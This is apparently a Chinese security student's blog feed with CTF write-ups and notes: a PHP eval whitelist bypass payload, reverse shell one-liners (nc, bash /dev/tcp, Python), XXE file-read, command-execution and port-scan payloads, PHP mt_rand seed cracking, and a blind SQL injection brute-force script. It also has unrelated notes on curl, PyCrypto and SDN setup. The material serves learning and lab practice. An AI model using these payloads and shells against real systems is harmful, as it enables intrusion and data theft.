//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh']; preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs); foreach ($used_funcs[0] as $func) &#123; if (!in_array($func, $whitelist)) &#123; die("请不要输入奇奇怪怪的函数"); &#125; &#125; //帮你算出答案 eval('echo '.$content.';'); &#125; 代码分析： 1.黑名单 if (preg_match(&apos;/&apos; . $blackitem . &apos;/m&apos;, $content)) 2.白名单 preg_match_all(&apos;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&apos;, $content, $used_funcs); foreach ($used_funcs[0] as $func) { if (!in_array($func, $whitelist)) { die(&quot;请不要输入奇奇怪怪的函数&quot;); } }其中： [] 表示单个字符的原子表，例如[a-zA-Z0-9]表示任意一位大小字母或数字 * 表示任意次 $used_funcs存储所有匹配到的结果，$used_funcs[0]将包含完整模式匹配到的文本 即匹配到所有的：第一位字符为大小写英文字母、下划线、0x7f到0xff，第二位字符为大小写英文字母、下划线、数字、0x7f到0xff；第三位字符重复… 将这些匹配到的字符放到$used_funcs[0]数组中，并遍历这个数组，看里面的字符串是否在白名单里面，如果不在则退出脚本 也表明，可以传入的字符有：$、（、）、;、{、}… 思路： 数学函数表：http://www.w3school.com.cn/php/php_ref_math.asp 1.有个base_convert函数，可以将数字转换成字母，从而可以构造出其他函数： base_convert — 在任意进制之间转换数字 string base_convert( string $number, int $frombase, int $tobase) 返回一字符串，包含 number 以 tobase 进制的表示。number 本身的进制由 frombase 指定。frombase 和 tobase 都只能在 2 和 36 之间（包括 2 和 36）。高于十进制的数字用字母 a-z 表示，例如 a 表示 10，b 表示 11 以及 z 表示 35。 在线进制转换网站：http://www.atool9.com/hexconvert.php 36进制的phpinfo的10进制为55490343972，则构造payload： c=base_convert(55490343972,10,36)()可以看到成功输出了phpinfo信息： 2.但不能只依赖base_convert函数，因为需要读取的flag.php这个字符串是它构造不出来的，它只能转换为数字和字母 能够将数字转换为字符串的函数处了base_convert，还有hex2bin，但这个函数是白名单里面没有的，因此需要用base_convert去构造 hex2bin 16进制转换为2进制字符串 这里2进制字符串也就相当于二进制ASCII码对应的字符串 16进制中也含有字母，因此需要用dechex函数将10进制转换为16进制而不是直接用16进制 dechex 十进制转换为十六进制 所能转换的最大数值为十进制的 PHP_INT_MAX * 2 + 1 (或 -1)：在 32 位平台上是十进制的 4294967295，其 dechex() 的结果为 ffffffff 因此构造流程为： 10进制数由dechex函数转换为16进制数--》16进制数再由hex2bin函数转换为字符串如果要直接构造读取flag.php，那么思路就是： 用base_convert构造出hex2bin 用dechex构造出readfile(&#39;flag.php&#39;) 因此payload是这样的： c=base_convert(37907361743,10,36)(dechex(186061670364112526798887))但用PHP会解析失败，原因是数字太大了… 3.由于有白名单正则匹配，参数c中不允许出现除了数学函数外的其他字母，因此要想办法利用其他参数：用$_GET函数，接收其他参数，来完成flag文件的读取 有两个知识： PHP可变变量，一个变量的值作为另一个变量的名： 123456&lt;?php$a = 'hello';$$a = 'world';echo $$a;?&gt;//输出 world PHP大括号的使用；因为一般取数组的某个值时使用中括号，这里中括号是被过滤了的，但可以使用大括号： 12345&lt;?php$a = array(&apos;a&apos; =&gt; &apos;b&apos;);echo $a&#123;a&#125;;?&gt;//输出 b 这时候虽然大括号里面没有用引号将下标引起来，报出Notice，但是会输出结果；这点与中括号一样 4.构造思路如下： 参数c中产生$_GET函数($_POST)，并且接受两个参数，一个参数值是文件名flag.php，另一个参数值是读取源码的函数，如highlight_file，show_source，readfile，system(cat flag.php) 由于参数c中不能出现非白名单函数字母，因此接收的参数名可以为白名单的数学函数名、数字 123456$abs = 'flag.php';$pow = 'show_source';$c = "$pi='_GET';$$pi&#123;pow&#125;($$pi&#123;abs&#125;)"; 这里为什么不能让$pi=&#39;$_GET&#39;?因为这样的话$pi就成了一个字符串了，而不是成为超全局数组变量 5.将参数c中的非白名单字符串，即_GET用base_convert函数与dechex函数进行转换(为什么不能直接用base_convert转换？因为该字符串存在下划线，不属于36进制内)： 首先用base_convert构造出hex2bin： base_convert(37907361743,10,36)之后将_GET转换为16进制： 5f474554再将16进制转为10进制： 1598506324则参数c的payload： c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pow}($$pi{abs})最终payload： ?abs=flag.php&amp;pow=show_source&amp;c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pow}($$pi{abs})]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Linux curl]]></title>
    <url>%2F2019%2F05%2F09%2FLinux-curl%2F</url>
    <content type="text"><![CDATA[curl是linux下的一款利用url规则在命令行下使用的http工具 获取htmlget格式： curl www.baidu.com即可显示百度的html 直接将html写入到文件： curl -o baidu.html www.baidu.compost1.发送数据： curl -X POST -d &quot;pass=hack&quot; http://123.206.87.240:8002/webshell/shell.php-X POST可以省略 2.上传文件： curl 127.0.0.1 -F &quot;file=@a.png&quot;-F：将会以multipart/form-data发送POST数据；如果发送文件，则需在文件路径前加@ 获取cookie格式： curl -c cookie.txt www.baidu.com获取response header格式： curl -D header.txt www.baidu.com使用cookie格式： curl -b cookie.txt www.baidu.com其中，cookie.txt保存有需要发送的cookie 指定本地某端口访问服务器curl --local-port 51 www.baidu.com指定请求头curl -H &apos;X-Forwarded-For:127.0.0.1&apos; -H &apos;Cookie:233&apos; www.baidu.com]]></content>
      <categories>
        <category>Linux</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[反弹shell]]></title>
    <url>%2F2019%2F05%2F08%2F%E5%8F%8D%E5%BC%B9shell%2F</url>
    <content type="text"><![CDATA[反弹shell，就是在控制端进行tcp/udp监听，被控端发起请求到该端口，并将其命令行的输入输出转到控制端 Linux ncnc，netcat，可以在两台电脑之间建立连接，并返回两个数据流 相互通信在主机192.168.80.129的1234端口启动服务： nc -v -l 192.168.80.129 1234进行连接： nc -v 192.168.80.129 1234连接成功后，可以在当前机器输入信息，且会在目标机器显示；反之，在被控端输入，也会在当前控制端显示 默认为tcp连接，可以添加参数-u改为udp连接 参数 -v参数可以输出连接详细信息 -l参数设置为监听模式 反弹shell正向反弹shell首先服务器端进行监听并反弹shell： nc -lvp 1234 -e /bin/bash参数： -p：指定端口 之后本地连接： nc 192.168.80.129 1234即可获得服务器端的shell 反向反弹shell首先本地进行监听： nc -lvp 1234之后服务端反弹shell： nc -e /bin/bash 1234同样可获得服务器端的shell Linux bashbash是linux下的一种shell； 使用bash指令反弹shell： bash -i &gt;&amp; /dev/tcp/192.168.80.129/1234 0&gt;&amp;1解释： -i：产生交互式的shell /dev/tcp/ip/port：读取或写入相当于进行socket调用 Python使用python反弹shell： python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.80.129&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&apos;]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[XML-DTD与XXE]]></title>
    <url>%2F2019%2F05%2F04%2FXML-DTD%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[DTD，文档定义类型，它使用一系列合法的元素来定义文档的结构；可用于验证接收到的以及自己的数据的有效性 XML文档的MIME类型：text/xml 内部DTDDTD被包含在XML文件中 声明语法： &lt;!DOCTYPE 根元素 [元素声明]&gt;例如： &lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE note [ &lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!ELEMENT to (#PCDATA)&gt; &lt;!ELEMENT from (#PCDATA)&gt; &lt;!ELEMENT heading (#PCDATA)&gt; &lt;!ELEMENT body (ANY)&gt; ]&gt; &lt;note&gt; &lt;to&gt;George&lt;/to&gt; &lt;from&gt;John&lt;/from&gt; &lt;heading&gt;Reminder&lt;/heading&gt; &lt;body&gt;Don&apos;t forget the meeting!&lt;/body&gt; &lt;/note&gt;解释： 1.&lt;!DOCTYPE note [定义内部DTD，note为此xml文档的根元素 2.&lt;!ELEMENT note (to,from,heading,body)&gt;定义note节点中有四个子节点 3.&lt;!ELEMENT to (#PCDATA)&gt;定义to元素为#PCDATA类型 4.&lt;!ELEMENT body (ANY)&gt;:ANY关键字表示元素中可以出现任何内容,也可以为空 … 外部DTDDTD位于XML文件外部 声明语法： &lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;注：默认情况，xml文档不会加载外部DTD 例如： &lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt; &lt;note&gt; &lt;to&gt;George&lt;/to&gt; &lt;from&gt;John&lt;/from&gt; &lt;heading&gt;Reminder&lt;/heading&gt; &lt;body&gt;Don&apos;t forget the meeting!&lt;/body&gt; &lt;/note&gt; note.dtd： &lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!ELEMENT to (#PCDATA)&gt; &lt;!ELEMENT from (#PCDATA)&gt; &lt;!ELEMENT heading (#PCDATA)&gt; &lt;!ELEMENT body (#PCDATA)&gt;实体实体可以定义引用普通文本或特殊字符的快捷方式的变量；实体引用是对实体的引用 预定义实体xml预定义了五个实体引用：用 &amp;lt; &amp;gt; &amp;amp; &amp;apos; &amp;quot; 替换 &lt; &gt; &amp; &apos; &quot; 。字符实体使用十进制或十六进制来表示unicode字符 例如： &lt;?xml version=&quot;1.0&quot;?&gt; &lt;note&gt;&amp;#97; &amp;#x61;&lt;/note&gt;会被解析成： &lt;note&gt;a a&lt;/note&gt;一般实体引用格式同预定义实体：&amp;实体名称; 内部实体声明语法： &lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;例如： &lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE author [ &lt;!ENTITY aha &quot;hello&quot;&gt; &lt;!ENTITY hah &quot;world&quot;&gt; ]&gt; &lt;author&gt;&amp;aha; &amp;hah;&lt;/author&gt;被浏览器解析会显示： &lt;author&gt;hello world&lt;/author&gt;外部实体声明语法： &lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;注：浏览器中外部实体不能被解析 参数实体只有在DTD中才能引用参数实体；引用格式：%实体名称; 语法： &lt;!ENTITY % 实体名 &quot;实体默认值&quot;&gt;例如： &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE root [ &lt;!ENTITY % param1 &quot;&lt;!ENTITY internal &apos;http://www.baidu.com&apos;&gt;&quot;&gt; %param1; ]&gt; &lt;root&gt; [This is my site] &amp;internal; &lt;/root&gt;会被解析成： &lt;root&gt; [This is my site] http://www.baidu.com &lt;/root&gt;注：不同浏览器解析结果不同，IE和Firefox正常解析，Chrome会报错 XXE漏洞XXE，XML External Entity Injection，xml外部实体注入漏洞 在phpstudy测试的时候发现无法解析xml外部实体，在一个帖子看到php的版本5.2.17和5.4.45可以解析，再往后的版本就不行了。 环境：windows10，phpstudy5.4.45 漏洞代码： 12345&lt;?php$data = file_get_contents(&apos;php://input&apos;);$xml = simplexml_load_string($data);var_dump($xml);?&gt; simplexml_load_string()：读取xml文档，返回一个可迭代对象 任意文件读取在C盘下创建一个文件夹test，在里面创建一个test.txt文件，在文件里写入123456 则构造payload读取这个文件内容： &lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE root [ &lt;!ENTITY v SYSTEM &quot;file:///c:/test/test.txt&quot;&gt; ]&gt; &lt;root&gt;&amp;v;&lt;/root&gt;此时，页面会显示： object(SimpleXMLElement)#1 (1) { [“v”]=&gt; object(SimpleXMLElement)#2 (1) { [“v”]=&gt; string(6) “123456” } } 即读取到了test.txt的内容 注：如果目标文件含有尖括号&lt; &gt;，则直接读取会产生错误信息：parser error : Couldn’t find end of Start Tag 除此之外，可以使用的协议： 使用php://协议payload： &lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE root [ &lt;!ENTITY v SYSTEM &quot;php://filter/read=convert.base64-encode/resource=c:/test/test.txt&quot;&gt; ]&gt; &lt;root&gt;&amp;v;&lt;/root&gt;此时，页面会显示： object(SimpleXMLElement)#1 (1) { [“v”]=&gt; object(SimpleXMLElement)#2 (1) { [“v”]=&gt; string(8) “MTIzNDU2” } } 即读取到了test.txt经base64编码后的内容 命令执行运用expect://(处理交互式的流)来执行系统命令； Note: 该封装协议默认未开启 为了使用 expect:// 封装器，你必须安装 » PECL 上的 » Expect 扩展。 由于是在phpstudy上做的测试，不能使用这个协议(需要linux)；思路： &lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE root [ &lt;!ENTITY v SYSTEM &quot;expect://ls&quot;&gt; ]&gt; &lt;root&gt;&amp;v;&lt;/root&gt;内网探测探测内网开发端口，payload： &lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE root [ &lt;!ENTITY v SYSTEM &quot;http://127.0.0.1:80&quot; &gt;]&gt; &lt;root&gt;&amp;v;&lt;/root&gt;页面显示： object(SimpleXMLElement)#1 (1) { [“v”]=&gt; object(SimpleXMLElement)#2 (1) { [“v”]=&gt; string(11) “hello world” } } 这表明我的80端口是打开的，但探测关闭的81端口，就会报错： 同文件读取，目标网页不能含有尖括号，否则会产生错误信息；可以结合php://filter来进行探测]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[python Crypto库]]></title>
    <url>%2F2019%2F04%2F24%2Fpython-Crypto%2F</url>
    <content type="text"><![CDATA[学习python的Crypto库 安装windows10安装开始想在python3.6安装，直接pip install pycrypto，发现报错，后来在网上找了一种简单的在python2安装这个库的： 到http://www.voidspace.org.uk/python/pycrypto-2.6.1/下载对应python版本的文件，由于用的是python2.7，则这里下载的是pycrypto-2.6.1.win-amd64-py2.7.exe；之后直接移动到python2.7文件夹下，双击exe安装即可 安装好后可以测试导入这个库，不报错则说明安装成功了： Ubuntu安装在Ubuntu直接安装： sudo apt-get install python3-crypto使用使用help()命令查看使用方法 1.Crypto.CipherSecret-key (AES, DES, ARC4) and public-key encryption (RSA PKCS#1) algorithms AES &gt;&gt;&gt; from Crypto.Cipher import AES &gt;&gt;&gt; secret = &quot;12345678912345678912345678912345&quot; # AES key must be either 16, 24, or 32 bytes long &gt;&gt;&gt; cipher = AES.new(secret) &gt;&gt;&gt; cipher &lt;Crypto.Cipher.AES.AESCipher object at 0x7f19e939a630&gt; &gt;&gt;&gt; s = cipher.encrypt(&quot;1234567891234567&quot;) &gt;&gt;&gt; s b&apos;\xbbvQ\xe4\xc1\xe1\x98\xbb[v\x87\x18k\x1f\xb9\xe9&apos; &gt;&gt;&gt; cipher.decrypt(s) b&apos;1234567891234567&apos;DES from Crypto.Cipher import DES &gt;&gt;&gt; secret = &quot;11111111&quot; # Key must be 8 bytes long &gt;&gt;&gt; cipher = DES.new(secret) &gt;&gt;&gt; s = cipher.encrypt(&quot;1234567891234567&quot;) &gt;&gt;&gt; s b&apos;\x85\x8b\x17m\xa8\xb1%\x03\xc2\xa4J\xf5Dn\xf2B&apos; &gt;&gt;&gt; cipher.decrypt(s) b&apos;1234567891234567&apos;2.Crypto.HashHashing algorithms (MD5, SHA, HMAC) MD5 &gt;&gt;&gt; from Crypto.Hash import MD5 &gt;&gt;&gt; h = MD5.new() &gt;&gt;&gt; h.update(b&apos;Hello&apos;) &gt;&gt;&gt; s = h.hexdigest() &apos;8b1a9953c4611296a827abf8c47804d7&apos;3.Crypto.ProtocolCryptographic protocols (Chaffing, all-or-nothing transform, key derivation functions). This package does not contain any network protocols. 4.Crypto.PublicKeyPublic-key encryption and signature algorithms (RSA, DSA) 从公钥文件中提取n和e： from Crypto.PublicKey import RSA public_key = RSA.importKey(open(&apos;pubkey.pem&apos;).read()) n = public_key.n e = public_key.e生成私钥文件： keypair = RSA.generate(1024) keypair.p = p keypair.q = q keypair.e = e keypair.n = n keypair.d = d private_key = keypair.exportKey().decode(&apos;utf-8&apos;) f = open(&apos;private.pem&apos;, &apos;w&apos;) f.write(private_key)5.Crypto.SignaturePublic-key signature algorithms (RSA PKCS#1) 6.Crypto.UtilVarious useful modules and functions (long-to-string conversion, random number generation, number theoretic functions) (1)Crypto.Util.numberNumber-theoretic functions (primality testing, etc.) GCD(x, y) GCD(x:long, y:long): longReturn the GCD of x and y. bytes_to_long(s) bytes_to_long(string) : longConvert a byte string to a long integer. This is (essentially) the inverse of long_to_bytes(). getPrime(N, randfunc=None) getPrime(N:int, randfunc:callable):longReturn a random N-bit prime number. If randfunc is omitted, then Random.new().read is used. inverse(u, v) inverse(u:long, v:long):longReturn the inverse of u mod v.]]></content>
      <categories>
        <category>crypto</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[php mt_rand()安全]]></title>
    <url>%2F2019%2F04%2F19%2Fphp-mt-rand-%E5%AE%89%E5%85%A8%2F</url>
    <content type="text"><![CDATA[这个知识点以前没有遇到过，在上上周的西湖论剑上有一道题涵盖了这个知识点，当时明文攻击都没有成功…现在电脑上已经有三个压缩解压工具啦(crying) rand()、mt_rand()rand()官方文档： int rand( void) int rand( int $min, int $max)如果没有提供可选参数 min 和 max，rand() 返回 0 到 getrandmax() 之间的伪随机整数。例如想要 5 到 15（包括 5 和 15）之间的随机数，用 rand(5, 15)。Note: 在某些平台下（例如 Windows）getrandmax() 只有 32767。如果需要的范围大于 32767，那么指定 min 和 max 参数就可以生成更大的数了，或者考虑用 mt_rand() 来替代之。 更新日志4.2.0 随机数发生器自动进行播种。 mt_rand()官方文档： int mt_rand( void) int mt_rand( int $min, int $max)很多老的 libc 的随机数发生器具有一些不确定和未知的特性而且很慢。PHP 的 rand() 函数默认使用 libc 随机数发生器。mt_rand() 函数是非正式用来替换它的。该函数用了 » Mersenne Twister 中已知的特性作为随机数发生器，它可以产生随机数值的平均速度比 libc 提供的 rand() 快四倍。 如果没有提供可选参数 min 和 max，mt_rand() 返回 0 到 mt_getrandmax() 之间的伪随机数。例如想要 5 到 15（包括 5 和 15）之间的随机数，用 mt_rand(5, 15)。 更新日志 4.2.0 随机数发生器自动进行播种。 在windows下测试的rand()默认的最大值为32767，mt_rand()默认的最大值为2147483647 真/伪随机数注意，在官方文档描述中，上面两个函数生成的随机数都是伪随机数 在大一学的C++书中也提到了生成随机数的函数rand()： rand()函数(在调用它时头文件要包含< cstdlib >)可以用来产生随机数，但这不是真正意义上的随机数，是一个伪随机数，它是以一个数(可以称它为种子(seed))为基准，以某个递推公式算出来的一系列数(随机序列)。当计算机开机后，这个种子的值是确定的，为了改变这个种子的值，C++提供了srand()函数，功能是初始化随机产生器。 可以将time(0)，即时间戳作为参数传到srand()函数中，这样就能产生真随机数了 在php官方文档描述的是随机数发生器自动进行播种，那么到底是怎样进行播种的呢？参考的文章总结如下： php的自动播种发生在php cgi进程中第一次调用mt_rand()的时候。跟访问的页面无关，只要是同一个进程处理的请求，都会共享同一个最初自动播种的种子。 php_mt_seed在php中，可以使用mt_srand()进行播种 官方文档： mt_srand — 播下一个更好的随机数发生器种子说明 void mt_srand([ int $seed] ) 用 seed 来给随机数发生器播种。 没有设定 seed 参数时，会被设为随时数。 Note: 自 PHP 4.2.0 起，不再需要用 srand() 或 mt_srand() 给随机数发生器播种 ，因为现在是由系统自动完成的。 可以使用工具爆破种子：https://github.com/lepiaf/php_mt_seed git clone https://github.com/lepiaf/php_mt_seed cd php_mt_seed make现在做个测试： 在phpstudy网站根目录，建立index.php文件和rand.php文件，在rand.php中写入： 123456&lt;?phpfor($i=0; $i&lt;10; $i++)&#123; echo mt_rand()."&lt;br&gt;";&#125;?&gt; 现在，访问127.0.0.1/rand.php，，显示 1642237942 1234263933 308913717 1749113931 847118977 1982980330 1853851711 1405394624 1052363538 195010783那么使用上面的工具爆破种子： time ./php_mt_seed 1642237942发现爆出了一个种子2972913307 在index.php中写入： 12345678&lt;?phpmt_srand(2972913307);for($i=0; $i&lt;20; $i++)&#123; echo mt_rand()."&lt;br&gt;";&#125;?&gt; 访问127.0.0.1/index.php，输出： 1642237942 1234263933 308913717 1749113931 847118977 1982980330 1853851711 1405394624 1052363538 195010783 54559389 1040500600 1360486511 1429697000 214486007 1268030276 298349955 1246753272 1381254604 1935697126发现前十位随机数是一样的，则预测到了下几次的随机数； 再次刷新rand.php，会发现显示的十个随机数与index.php显示的后十个随机数是一样的 参考文章：https://mp.weixin.qq.com/s/3TgBKXHw3MC61qIYELanJg]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[SDN实验配置]]></title>
    <url>%2F2019%2F04%2F14%2FSDN%E5%AE%9E%E9%AA%8C%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[记录SDN实验的一些配置，有点麻烦 参考： https://www.cnblogs.com/luckyguy/p/4062313.html Floodlight是一款开源的SDN控制器，Mininet是一个轻量级的SDN网络仿真平台 环境搭建：VMware，虚拟机manjaro javamanjaro自带python环境，因此不用安装。 安装java8： 去官网下载jdk：https://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html 之后解压下载的tar.gz文件，在控制台输入： sudo cp -pr jdk1.8.0_201 /opt sudo ln -s /opt/jdk1.8.0_201/bin/java /usr/bin/java之后就可以测试java是否安装成功，在控制台输入java -version，会显示java version &quot;1.8.0_201&quot;，就代表成功了 ant之后需要安装ant： 下载地址为：http://ant.apache.org/ 下载后解压，复制到usr目录 然后改变权限 chmod 777 apache-ant-1.10.4修改系统环境变量： vi /etc/profile在文件的最后加上如下两行代码： #set Ant enviroment export ANT_HOME=/usr/apache-ant-1.9.2 export PATH=$PATH:$ANT_HOME/bin使环境变量生效： source /etc/profile之后输入ant测试是否安装成功 floodlight按照这个网站的方法： $ git clone git://github.com/floodlight/floodlight.git $ cd floodlight $ git submodule init $ git submodule update $ ant $ sudo mkdir /var/lib/floodlight $ sudo chmod 777 /var/lib/floodlight之后ant编译成功，输入 $ java -jar target/floodlight.jar打开 http://localhost:8080/ui/pages/index.html看到floodlight界面就说明安装成功了 mininet下载安装有mininet的虚拟机文件：https://github.com/mininet/mininet/wiki/Mininet-VM-Images 之后直接打开虚拟机，账号和密码都是mininet 添加一块网卡：虚拟机设置-网络适配器-添加，默认的网卡是NAT，新添加的配成VMNet1 之后，启用eth1网卡： sudo dhclient eth1将eth1配置加入到网络配置文件： sudo vi /etc/network/interfaces打开后加入： auto eth1 iface eth1 inet dhcp保存后重启即可 测试用xshell连接mininet，连接时使用配置的网卡1的ip地址，用户名密码都是mininet，连接登录后输入指令： sudo mn --controller=remote,ip= ,port= 这里ip地址为运行floodlight的ip，端口号为6633或6653(尝试一下) 之后刷新运行floodlight的网页，会看到有交换机]]></content>
      <categories>
        <category>SDN</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[pikachu靶机搭建及phpstudy端口配置]]></title>
    <url>%2F2019%2F04%2F08%2F%E9%9D%B6%E6%9C%BA%E5%8F%8A%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[记录一些配置 pikachu靶机环境搭建环境：windows10，phpStudy 2018 pikachu靶场链接：https://github.com/zhuifengshaonianhanlu/pikachu 下载后，将pikachu-master文件夹放到网站根目录下； 之后配置数据库：进入inc/config.inc.php，修改mysql用户名和密码，这里是默认的，就不用改动了 进入http://127.0.0.1/pikachu-master/index.php，点击安装就行了~ phpstudy配置端口phpstudy有个网站根目录，在里面可以添加index.php等文件，之后再访问127.0.0.1:80或127.0.0.1/index.php，就可以访问这个根目录了 但我想改变其端口号，访问其他WWW服务，要怎么弄呢？其实还是很容易的 首先，先建立一个文件夹，用于存放网站相关文件；建立的文件要放在phpstudy目录下，比如我phpstudy安装在D盘，则这个新建的文件夹要放在D:\phpStudy下；进入到这个新建的文件夹，在里面新建一个index.php文件 然后，打开phpstudy，进入到其他选项菜单-站点域名管理-新增站点，设置端口等信息后保存重启就行啦~ 小米球的使用这个工具是昨天看了实验室大佬的文章才知道的 文章链接 小米球下载地址 运行phpstudy后，打开小米球Ngrok启动工具，输入前缀和端口号，再访问生成的网址就好啦~]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[掘安杯wp]]></title>
    <url>%2F2019%2F04%2F06%2F%E6%8E%98%E5%AE%89%E6%9D%AFwp%2F</url>
    <content type="text"><![CDATA[今天从早上起床一直到比赛结束一直在做题(起的比较晚)……比赛的时候还是手忙脚乱，电脑也真是不给力，全程在卡着…从这次比赛也看到了自己准备的不够充分，一些平时常见的比较简单的知识点之前没有在意，比赛又碰见相似的，还是要百度查一下，而且好久没做SQL注入的题目了，这次竟然一时没有想起来怎么做，到比赛结束才写出爆破密码的脚本。emmm难受，写一下一些做题时的思路 签到题访问链接，发现从flag.php重定向到了404.php，检查-network，查看请求flag.php返回的头信息，得到经base64编码的flag，解码即可 下载下载进到网站，有个链接http://120.79.1.69:8887/web2/?file=flag.txt，发现存在任意文件下载漏洞，然后下载flag.php；发现代码里面有两个写好的函数，一个经加密后的字符串，则直接调用解密函数，得到flag 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?phpheader('Content-Type: text/html; charset=utf-8'); //网页编码function encrypt($data, $key) &#123; $key = md5 ( $key ); $x = 0; $len = strlen ( $data ); $l = strlen ( $key ); for($i = 0; $i &lt; $len; $i ++) &#123; if ($x == $l) &#123; $x = 0; &#125; $char .= $key &#123;$x&#125;; $x ++; &#125; for($i = 0; $i &lt; $len; $i ++) &#123; $str .= chr ( ord ( $data &#123;$i&#125; ) + (ord ( $char &#123;$i&#125; )) % 256 ); &#125; return base64_encode ( $str );&#125;function decrypt($data, $key) &#123; $char = ''; $str = ''; $key = md5 ( $key ); $x = 0; $data = base64_decode ( $data ); $len = strlen ( $data ); $l = strlen ( $key ); for($i = 0; $i &lt; $len; $i ++) &#123; if ($x == $l) &#123; $x = 0; &#125; $char .= substr ( $key, $x, 1 ); $x ++; &#125; for($i = 0; $i &lt; $len; $i ++) &#123; if (ord ( substr ( $data, $i, 1 ) ) &lt; ord ( substr ( $char, $i, 1 ) )) &#123; $str .= chr ( (ord ( substr ( $data, $i, 1 ) ) + 256) - ord ( substr ( $char, $i, 1 ) ) ); &#125; else &#123; $str .= chr ( ord ( substr ( $data, $i, 1 ) ) - ord ( substr ( $char, $i, 1 ) ) ); &#125; &#125; return $str;&#125;$key="MyCTF";$flag="o6lziae0xtaqoqCtmWqcaZuZfrd5pbI=";//encrypt($flag,$key)echo decrypt($flag, $key);?&gt; 猜密码源码： &lt;html&gt; &lt;head&gt; &lt;title&gt;猜密码&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;!-- session_start(); $_SESSION[&apos;pwd&apos;]=time(); if (isset ($_POST[&apos;password&apos;])) { if ($_POST[&apos;pwd&apos;] == $_SESSION[&apos;pwd&apos;]) die(&apos;Flag:&apos;.$flag); else{ print &apos;&lt;p&gt;猜测错误.&lt;/p&gt;&apos;; $_SESSION[&apos;pwd&apos;]=time().time(); } } --&gt; &lt;form action=&quot;index.php&quot; method=&quot;post&quot;&gt; 密码：&lt;input type=&quot;text&quot; name=&quot;pwd&quot;/&gt; &lt;input type=&quot;submit&quot; value=&quot;猜密码&quot;/&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt;在本地测试(将上面注释部分放到PHP文件，定义一个flag变量)，写个简单的脚本： 1234567import timeimport requestsurl = "http://127.0.0.1/index.php"t = round(time.time())form_data=&#123;'pwd': '&#123;&#125;'.format(t), 'password':'1'&#125;r = requests.post(url,data=form_data)print(r.text) 但看大佬的文章，直接点击提交获得flag什么鬼… 该网站已被黑扫后门爆破的，这页面跟去年暑假训练营做的那道题一样啊… 扫描目录，发现shell.php，进去后发现是个登录页面，爆破密码，用burpsuit自带的password字典，爆破得密码为hack 曲折的人生本来挺简单的，但好久没做SQL题，愣是想了好久 提交后发现有报错回显 select id,username,password from `admin` where username=&apos;admin&apos;&lt;br/&gt;用户名:admin不正确进行or测试，发现有过滤，双写即可绕过，还发现过滤了空格，用括号或注释符即可绕过: 开始构造： 1&apos;oorr(1=1)显示出了正确的用户名(此时用这个用户名输入也是错的，因为过滤了or，而用户名中含有这个，因此用户名也需要双写or)，但密码错误，则这两条语句是分开写的，不然注释符就能注释掉密码部分了 根据回显，知道了有password这个字段，则可以直接获取password；急着做就没有将脚本写完整，分开写的，password长度都没测…过滤了or，则password也需要双写or！： 1234567891011url = 'http://120.79.1.69:8887/web5/?check'for j in range(1,50): for i in range(32,128): data = &#123;'username':"1'oorr(ascii(substr(passwoorrd,&#123;0&#125;,1))=&#123;1&#125;)#".format(j,i), 'password':'1', 'code':'1'&#125; #print(data) req = requests.post(url, data=data) req.encoding = 'utf-8' if "goodboy_g-60Hellowor" in req.text: print(chr(i), end='') break 爆出password，然后写出过验证码的脚本；比较坑的是得到的式子的括号是中文的，要替换成英文，还要将X替换为*，不然python的eval函数识别不出来，四舍五入就直接用round函数就行了： 12345678910111213141516import requestsimport res = requests.session()url = 